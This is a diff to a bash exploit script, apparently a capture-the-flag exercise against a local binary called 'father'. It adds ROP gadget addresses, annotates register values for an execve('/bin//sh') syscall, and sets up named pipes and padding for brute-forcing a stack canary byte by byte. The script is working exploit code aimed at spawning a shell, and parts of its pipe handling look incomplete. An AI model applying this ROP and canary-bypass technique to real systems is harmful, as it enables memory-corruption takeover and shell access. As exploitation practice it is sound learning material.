@@ -12,6 +12,7 @@ fi
 
 
 : << ROPGadgets
+
 0x0000000000451064: push rsp; ret;
 0x000000000042d6ce: push rdi; ret;
 0x00000000004c2926: push rsi; ret;
@@ -26,15 +27,23 @@ fi
 0x0000000000410893: pop rsi; ret;
 0x0000000000401f13: pop rsp; ret;
 
+0x0000000000488931: mov qword ptr [rsi], rax; ret;
+0x000000000044707b: mov qword ptr [rdi], rsi; ret;
+0x0000000000435693: mov qword ptr [rdi], rdx; ret;
+0x000000000043538b: mov qword ptr [rdi], rcx; ret;
+
 0x0000000000422113: cdq; ret;
 
 0x00000000004013ec: syscall;
+
 ROPGadgets
 
 : << Values
-0x68732f2f6e69622f: "/bin//sh"
-0x0000000000000000: 0
-0x000000000000003b: 59
+
+0x68732f2f6e69622f:   "/bin//sh"   <- rdi
+0x0000000000000000:   0             = rsi, rdx
+0x000000000000003b:   59            = rax
+
 Values
 
 
@@ -55,14 +64,30 @@ p64() {
 }
 
 
-v18="1"
+mkfifo /tmp/03_input_pipe
+mkfifo /tmp/03_output_pipe
 
-echo -ne $v18 > payload_3_1
+safe_stack_buf=$(printf "\x01%0.s" $(seq 1 24))
 
-(cat payload_3_1; cat - ) | ./father
+canary=""
+declare -i canary_len=0
+declare -i byte_int_try=0
+
+cover_rbp=$(printf "\x01%0.s" $(seq 1 8))
 
 
 
+./father < /tmp/03_input_pipe > /tmp/03_output_pipe
+
+read line < /tmp/03_output_pipe
+if [[ $line == *"3. stop create child and get out"* ]];then
+    echo -ne "3" > /tmp/03_output_pipe
+fi
+
+read line < /tmp/03_output_pipe
+echo $line
 
 
+rm /tmp/03_input_pipe
+rm /tmp/03_output_pipe
 
